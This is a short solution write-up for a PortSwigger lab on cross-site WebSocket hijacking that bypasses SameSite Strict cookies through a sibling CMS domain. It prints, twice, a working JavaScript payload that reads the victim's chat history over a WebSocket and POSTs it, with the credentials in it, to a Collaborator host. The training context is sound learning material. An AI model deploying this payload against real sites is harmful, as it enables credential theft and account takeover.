# Lab: SameSite Strict bypass via sibling domain (Expert)

**Lab:** [https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)

**Task (from PortSwigger):**  
This lab's live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH). To solve the lab, log in to the victim's account.

Use the exploit server to perform a CSWSH attack that exfiltrates the victim's chat history to Burp Collaborator. The chat history contains the login credentials in plain text.

## Vulnerability
`SameSite=Strict` still allows same-site (sibling domain) requests. Sibling `cms-*.web-security-academy.net` can be used as a same-site gadget; chat WebSocket + chat history leaks credentials.

## Solution (CSWSH PoC)

```html
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```

If Strict blocks the cookie from the exploit origin, host/trigger the script via an XSS on the sibling CMS domain (same site) so the WebSocket is same-site. Poll Collaborator for the victim's credentials, then log in.

## Final Exploit Payload
```html
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() { ws.send("READY"); };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {
            method: 'POST', mode: 'no-cors', body: event.data
        });
    };
</script>
```
